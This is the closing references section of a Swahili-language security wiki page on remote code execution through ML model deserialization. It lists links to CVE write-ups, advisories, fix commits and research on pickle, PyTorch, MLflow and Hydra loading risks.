keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blogu ya OffSec – "CVE-2024-12029 – InvokeAI: Deserialization ya Data Isiyoaminika"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit ya marekebisho ya InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Nyaraka za module ya Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – masuala ya usalama ya torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blogu ya ZDI – CVE-2025-23298: Kupata Remote Code Execution katika NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Tahadhari ya ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit ya marekebisho ya Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader hatarishi kabla ya marekebisho (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC ya checkpoint hasidi (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader baada ya marekebisho (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution kwa kutumia fomati na maktaba za kisasa za AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Nyaraka za Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit ya block-list ya Hydra (onyo kuhusu RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Kutoka SQLi hadi RCE: Exploiting Checkpointer ya LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pivoting Archive Slip Bugs kuwa fursa za bounty za AI/ML zenye thamani kubwa](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Tahadhari ya Snyk na proof of concept ya PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Source ya MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – endpoint za kupakua na kupakia artifact](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Taxonomia ya kukwepa static-scanner ya Binarly MLTracer](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Ugunduzi wa Model Hasidi kwa MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Utekelezaji wa PyTorch storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Ramani ya uoanifu ya CPython pickle `find_class`](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Ramani ya import ya CPython `_compat_pickle`](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
